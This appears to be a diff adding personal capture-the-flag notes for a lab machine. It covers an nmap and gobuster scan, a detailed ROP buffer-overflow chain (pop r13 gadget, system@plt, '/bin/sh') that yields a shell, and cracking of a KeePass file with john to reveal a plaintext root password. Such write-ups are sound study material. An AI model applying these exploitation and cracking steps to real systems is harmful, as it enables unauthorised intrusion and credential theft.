@@ -1,0 +1,193 @@
+---PORT SCAN---
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
+|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
+|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+1337/tcp open  waste?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP: 
+|     07:46:12 up 7 min, 0 users, load average: 0.00, 0.00, 0.00
+|   DNSVersionBindReqTCP: 
+|     07:46:06 up 7 min, 0 users, load average: 0.00, 0.00, 0.00
+|   GenericLines: 
+|     07:45:53 up 6 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back?
+|   GetRequest: 
+|     07:46:00 up 6 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back? GET / HTTP/1.0
+|   HTTPOptions: 
+|     07:46:00 up 6 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back? OPTIONS / HTTP/1.0
+|   Help: 
+|     07:46:17 up 7 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back? HELP
+|   NULL: 
+|     07:45:53 up 6 min, 0 users, load average: 0.00, 0.00, 0.00
+|   RPCCheck: 
+|     07:46:01 up 6 min, 0 users, load average: 0.00, 0.00, 0.00
+|   RTSPRequest: 
+|     07:46:01 up 6 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back? OPTIONS / RTSP/1.0
+|   SSLSessionReq: 
+|     07:46:17 up 7 min, 0 users, load average: 0.00, 0.00, 0.00
+|     What do you want me to echo back?
+|   TLSSessionReq, TerminalServerCookie: 
+|     07:46:18 up 7 min, 0 users, load average: 0.00, 0.00, 0.00
+|_    What do you want me to echo back?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1337-TCP:V=7.80%I=7%D=9/18%Time=5F649C61%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,3E,"\x2007:45:53\x20up\x206\x20min,\x20\x200\x20users,\x20\x20load\x
+SF:20average:\x200\.00,\x200\.00,\x200\.00\n")%r(GenericLines,63,"\x2007:4
+SF:5:53\x20up\x206\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200
+SF:\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ec
+SF:ho\x20back\?\x20\r\n")%r(GetRequest,71,"\x2007:46:00\x20up\x206\x20min,
+SF:\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.0
+SF:0\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20
+SF:/\x20HTTP/1\.0\r\n")%r(HTTPOptions,75,"\x2007:46:00\x20up\x206\x20min,\
+SF:x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00
+SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\
+SF:x20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,75,"\x2007:46:01\x20up\x206\x20mi
+SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
+SF:.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIO
+SF:NS\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3E,"\x2007:46:01\x20up\x206\x20mi
+SF:n,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\
+SF:.00\n")%r(DNSVersionBindReqTCP,3E,"\x2007:46:06\x20up\x207\x20min,\x20\
+SF:x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")
+SF:%r(DNSStatusRequestTCP,3E,"\x2007:46:12\x20up\x207\x20min,\x20\x200\x20
+SF:users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n")%r(Help,
+SF:67,"\x2007:46:17\x20up\x207\x20min,\x20\x200\x20users,\x20\x20load\x20a
+SF:verage:\x200\.00,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me
+SF:\x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,64,"\x2007:46:17
+SF:\x20up\x207\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00
+SF:,\x200\.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x
+SF:20back\?\x20\x16\x03\n")%r(TerminalServerCookie,63,"\x2007:46:18\x20up\
+SF:x207\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.00,\x200\
+SF:.00,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\
+SF:?\x20\x03\n")%r(TLSSessionReq,64,"\x2007:46:18\x20up\x207\x20min,\x20\x
+SF:200\x20users,\x20\x20load\x20average:\x200\.00,\x200\.00,\x200\.00\n\nW
+SF:hat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x16\x03\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---GOBUSTER---
+/:
+  /manual (Status: 301)
+  /server-status (Status: 403)
+
+---ATTEMPTS---
+<!-- 'myapp' can be downloaded to analyze from here
+     its running on port 1337 -->
+*wget 10.10.10.147/myapp
+*file myapp
+  myapp: ELF 64-bit LSB executable
+using gdb to create a bufferoverflow
+*gdb myapp:
+  *pattern_create 200
+  *run PATTERN
+  *return
+  *pattern_offset GET ADDRESS
+    120
+120 is the size of the buffer
+it isnt possible to get the system libraries address of the target machine, the exploit must me made to exploit a code vulnerability
+the program write 112 bytes to rsi and then write 8 bytes into rbp and the rest to rsp
+
+in main:
+  401167:48 8d 3d 9a 0e 00 00 lea 0xe9a(%rip),%rdi # 402008 <_IO_stdin_used+0x8>
+  40116e:e8 cd fe ff ff callq  401040 <system@plt>
+
+$RDI always holds the address of first parameter, so if a string like "/bin/bash" is in RDI then system() will execute the bash
+
+there is another function in the executable that is <test> which is pretty simple: 
+  0000000000401152 <test>:
+    401152:       55                      push   %rbp
+    401153:       48 89 e5                mov    %rsp,%rbp
+    401156:       48 89 e7                mov    %rsp,%rdi
+    401159:       41 ff e5                jmpq   *%r13
+
+it basically just do what is necesary to the exploit works, which is move some value into RDI, and it's the RSP register. as previously checked, the rsp register can be changed by the overflow.
+
+first create a useless 112 bytes string;
+then creates a string '/bin/bash';
+then the main function should return to test;
+the test function will load the '/bin/bash' string to RDI register
+then 'jmpq *%r13' needs to jump right into the SYSTEM function
+and boom, shell executed
+
+searching a instruction that pops into r13
+*ropper --search "pop r13":
+  0x0000000000401206: pop r13; pop r14; pop r15; ret;
+
+in the end, the message that should be sended will be something like this:
+  BULLSHIT + SHELL (rbp) + (POP R13 ADDRESS) (rsp) + SYSTEM ADDRESS + 0 + 0 + TEST ADDRESS)
+
+explanation:
+  BULLSHIT: something to fill the entire buffer
+  SHELL: "/bin/sh\x00" string, will be loaded into rbp register
+  POP R13 ADDRESS: will be loaded into rsp and will be loaded into rip when ret function in reaches
+  SYSTEM ADDRESS: will be loaded into rsp and will be loaded into r13 register -> (pop r13).
+  0 + 0: will load two zeroes into the rsp register to full the next two pops
+  TEST ADDRESS: will be loaded when reaches the ret intruction execute;
+
+right after the sendline function:
+  BUFFER = BULLSHIT;
+  ebp -> "/bin/sh\x00"
+  ESP + 0-> POP R13 INSTRUCTION ADDRESS(0x401206)
+  ESP + 1 -> SYSTEM ADDRESS(0x401040)
+  ESP + 2 -> 0
+  ESP + 3 -> 0
+  ESP + 4 -> TEST ADDRESS(401152)
+
+then when reaches RET instruction:
+  ret (pop %rip): loading (ESP + 0) into rip register
+  %rip == 0x401206
+  0x401206 (pop %r13): loading (ESP + 1) into r13 register
+  0x401208 (pop %r14): loading (ESP + 2) into r14 register
+  0x40120a (pop %r15): loading (ESP + 3) into r15 register
+  0x40120c (retq (pop %rip)): loading (ESP + 4) into rip register
+  %rip == 0X401152
+  0x401152 (push %rbp): saving rbp register into stack (a pointer to "/bin/sh\x00")
+  0x401153 (mov %rsp, %rbp): setting the rbp register to point where the rsp points
+  0x401156 (mov %rsp, %rdi): loading the "/bin/sh\x00" into the %rdi - it was just pushed into the stack by rbp
+  0x401159 (jmpq *%r13): jumping to SYSTEM ADDRESS
+here it just executes the command in %rdi which is "/bin/sh\x00"
+
+creating a python script to send this lines using pwn
+*python3 exp_rop.py
+done!
+*cat /home/user/user.txt
+
+---PRIVESC---
+creating ssh keys into user so it can be used to run scp
+download the MyPasswords.kdbx, and the images
+using john to bruteforce using the images as keys
+
+*for x in images/*.JPG
+*do
+  *./keepass2john -k $x Myppaswords.kdbx >> hashes_keepass
+*done
+bruteforcing
+*sudo john -w=/usr/share/wordlists/rockyou.txt hashes_keepass:
+  bullshit         (MyPasswords)
+using kpcli to check what image is the key to the keepass
+*for x in images/*.JPG
+*do
+*  echo bullshit | kpcli --kdb MyPasswords.kdbx --key $x --command quit
+*  echo "current: $x"
+*done
+  Please provide the master password: *************************
+  current: images/IMG_0547.JPG
+using kpcli to check whats inside
+*kpcli --kdb MyPasswords.kdbx --key images/IMG_0547.JPG
+  kpcli:/MyPasswords> show 0 -f
+  Title: Root password
+  Uname: root
+   Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
+    URL: 
+  Notes:
+*su root
+kudos!
+cat /root/root.txt
